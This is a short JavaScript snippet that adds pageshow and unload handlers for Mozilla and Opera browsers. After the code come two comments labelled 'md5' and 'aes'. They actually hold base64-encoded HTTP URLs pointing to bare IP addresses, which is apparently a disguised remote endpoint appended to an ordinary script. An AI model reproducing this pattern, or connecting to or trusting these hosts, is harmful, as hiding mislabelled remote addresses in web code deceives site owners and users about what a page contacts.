if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzEwMS4xMzMuMTY0LjEyOC9hcHAvP2hhc2g9MTU4NTIzNTgyOTYwNQ==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/